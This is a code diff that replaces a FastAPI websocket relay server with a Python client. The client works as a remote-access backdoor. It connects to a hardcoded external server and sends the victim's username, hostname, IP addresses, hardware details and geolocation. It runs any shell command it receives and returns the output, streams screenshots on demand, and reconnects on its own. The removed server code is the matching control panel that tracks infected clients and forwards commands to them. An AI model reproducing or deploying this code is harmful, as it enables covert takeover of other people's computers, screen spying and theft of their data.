@@ -1,109 +1,137 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import HTMLResponse
-from fastapi.staticfiles import StaticFiles
-import uvicorn
-import time
+import asyncio
+import websockets
+import subprocess
+import uuid
+import getpass
+import io
+import mss
+import pyautogui
+import socket
+import platform
+import psutil
 import json
-import os
+import requests
+from PIL import Image, ImageDraw
 
-app = FastAPI()
+try:
+    import GPUtil
+except:
+    GPUtil = None
 
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+username = getpass.getuser()
+client_id = f"{username}-{uuid.uuid4()}"
+SERVER_URL = "wss://myman-w8p4.onrender.com/ws/client/"
 
-clients = {}
-last_seen = {}
-client_infos = {}
-admin_ws = None
-user_map = {}  # username -> client_id Zuordnung
+screenshot_mode = False
+jpeg_quality = 50
+sleep_time = 0.03
 
-@app.get("/clients")
-async def list_clients():
-    now = time.time()
-    result = []
-    for client_id in clients:
-        status = "Online" if now - last_seen.get(client_id, 0) < 20 else "Offline"
-        info = client_infos.get(client_id, {})
-        result.append({
-            "id": client_id,
-            "status": status,
-            "info": info
-        })
-    return {"clients": result}
-
-@app.websocket("/ws/client/{client_id}")
-async def websocket_client(websocket: WebSocket, client_id: str):
-    username = client_id.split("-")[0]  # username = erster Teil vor UUID
-    await websocket.accept()
-
-    # Falls ein alter Client für diesen username existiert → Disconnect
-    old_id = user_map.get(username)
-    if old_id and old_id != client_id:
-        old_ws = clients.get(old_id)
-        if old_ws:
-            await old_ws.close()
-        clients.pop(old_id, None)
-        last_seen.pop(old_id, None)
-        client_infos.pop(old_id, None)
-
-    # Neue Verbindung registrieren
-    clients[client_id] = websocket
-    user_map[username] = client_id
-    last_seen[client_id] = time.time()
-
+def gather_system_info():
     try:
-        while True:
-            data = await websocket.receive()
-            last_seen[client_id] = time.time()
-            if "text" in data:
-                try:
-                    msg = json.loads(data["text"])
-                    if msg.get("type") == "client_info":
-                        client_infos[client_id] = msg.get("data", {})
-                        continue
-                except:
-                    msg = data["text"]
-                if admin_ws:
-                    await admin_ws.send_text(f"[{client_id}] {msg}")
-            elif "bytes" in data:
-                if admin_ws:
-                    await admin_ws.send_bytes(data["bytes"])
-    except WebSocketDisconnect:
-        clients.pop(client_id, None)
-        last_seen.pop(client_id, None)
-        client_infos.pop(client_id, None)
-        if user_map.get(username) == client_id:
-            user_map.pop(username, None)
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+    except:
+        hostname = "Unbekannt"
+        local_ip = "Unbekannt"
 
-@app.websocket("/ws/admin")
-async def websocket_admin(websocket: WebSocket):
-    global admin_ws
-    await websocket.accept()
-    admin_ws = websocket
+    cpu_percent = psutil.cpu_percent(interval=None)
+    ram = psutil.virtual_memory()
+    ram_used = f"{ram.used // (1024 * 1024)} MB / {ram.total // (1024 * 1024)} MB"
+
+    gpu_info = "Unbekannt"
+    if GPUtil:
+        gpus = GPUtil.getGPUs()
+        if gpus:
+            gpu_info = f"{gpus[0].name} ({gpus[0].load * 100:.1f}%)"
+
+    public_ip = city = region = country = org = "Unbekannt"
     try:
+        res = requests.get("https://ipapi.co/json", timeout=2)
+        if res.status_code == 200:
+            data = res.json()
+            public_ip = data.get("ip", "Unbekannt")
+            city = data.get("city", "Unbekannt")
+            region = data.get("region", "Unbekannt")
+            country = data.get("country_name", "Unbekannt")
+            org = data.get("org", "Unbekannt")
+    except:
+        pass
+
+    return {
+        "hostname": hostname,
+        "local_ip": local_ip,
+        "cpu": f"{cpu_percent}%",
+        "ram": ram_used,
+        "gpu": gpu_info,
+        "os": platform.platform(),
+        "public_ip": public_ip,
+        "city": city,
+        "region": region,
+        "country": country,
+        "org": org
+    }
+
+async def screenshot_loop(ws):
+    global screenshot_mode
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
         while True:
-            msg = await websocket.receive_json()
-            target = msg.get("target")
-            cmd = msg.get("cmd")
-            if target in clients:
-                await clients[target].send_text(cmd)
-    except WebSocketDisconnect:
-        admin_ws = None
+            if screenshot_mode:
+                img = sct.grab(monitor)
+                img_pil = Image.frombytes("RGB", img.size, img.rgb)
+                x, y = pyautogui.position()
+                x -= monitor["left"]
+                y -= monitor["top"]
+                draw = ImageDraw.Draw(img_pil)
+                r = 10
+                draw.ellipse((x-r, y-r, x+r, y+r), fill="red", outline="black", width=2)
+                buf = io.BytesIO()
+                img_pil.save(buf, format='JPEG', quality=jpeg_quality)
+                asyncio.create_task(ws.send(buf.getvalue()))
+                await asyncio.sleep(sleep_time)
+            else:
+                await asyncio.sleep(0.1)
 
-@app.get("/")
-async def serve_index():
-    with open("static/index.html") as f:
-        html_content = f.read()
-    return HTMLResponse(content=html_content, status_code=200)
+async def message_loop(ws):
+    global screenshot_mode
+    while True:
+        msg = await ws.recv()
+        if msg == "screenshot_start":
+            screenshot_mode = True
+        elif msg == "screenshot_stop":
+            screenshot_mode = False
+        else:
+            try:
+                output = subprocess.check_output(msg, shell=True, text=True, stderr=subprocess.STDOUT)
+            except subprocess.CalledProcessError as e:
+                output = e.output
+            except Exception as e:
+                output = str(e)
+            await ws.send(output)
 
-app.mount("/static", StaticFiles(directory="static"), name="static")
+async def heartbeat_loop(ws):
+    while True:
+        try:
+            await ws.send("ping")
+        except:
+            break
+        await asyncio.sleep(5)
+
+async def run_client():
+    while True:
+        try:
+            uri = f"{SERVER_URL}{client_id}"
+            async with websockets.connect(uri, max_size=None) as ws:
+                sysinfo = gather_system_info()
+                await ws.send(json.dumps({"type": "client_info", "data": sysinfo}))
+                await asyncio.gather(
+                    message_loop(ws),
+                    screenshot_loop(ws),
+                    heartbeat_loop(ws)
+                )
+        except Exception as e:
+            print(f"⚠️ Connection lost: {e}, retrying in 5 sec...")
+            await asyncio.sleep(5)
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    uvicorn.run("main:app", host="0.0.0.0", port=port)
+    asyncio.run(run_client())
